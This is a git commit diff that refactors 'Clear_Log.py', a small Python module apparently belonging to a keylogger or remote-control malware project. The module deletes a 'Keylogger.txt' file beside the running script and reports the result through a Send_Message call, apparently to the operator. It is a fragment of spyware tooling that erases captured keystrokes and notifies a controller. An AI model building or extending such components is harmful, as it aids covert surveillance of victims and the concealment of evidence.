ab5e3882a72b649a9658184346d3adba05563194
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-07 08:25:36 +0300

    Update Clear_Log.py

--- Clear_Log.py
+++ Clear_Log.py
@@ -1,13 +1,13 @@
 import os, sys
 class Clear_Log():
 	def __init__(self, _):
-		self.Send_Message = _.Send_Message
+		self._ = _
 		self.Main()
 
 	def Main(self):
 		filename = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\Keylogger.txt"
 		if os.path.exists(filename):
 			os.remove(filename)
-			self.Send_Message.Send("%E2%9C%94%EF%B8%8F Keylogger Log Deleted")
+			self._.Send_Message("%E2%9C%94%EF%B8%8F Keylogger Log Deleted")
 		else:
-			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Log File Not Exists")
+			self._.Send_Message("%E2%9C%96%EF%B8%8F Log File Not Exists")
